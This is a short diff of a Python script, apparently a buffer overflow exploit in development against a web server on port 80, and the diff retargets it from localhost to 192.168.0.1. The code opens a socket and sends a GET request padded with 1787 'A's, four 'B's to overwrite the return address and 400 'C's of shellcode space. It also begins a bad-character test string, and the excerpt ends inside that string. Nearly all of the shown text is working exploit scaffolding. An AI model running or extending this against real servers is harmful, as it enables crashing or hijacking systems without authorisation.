@@ -1,6 +1,6 @@
 import socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(('127.0.0.1',80))
+sock.connect(('192.168.0.1',80))
 metodo_http = "GET "
 buff = "A"*1787 + "B"*4 + "C"*400
 badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
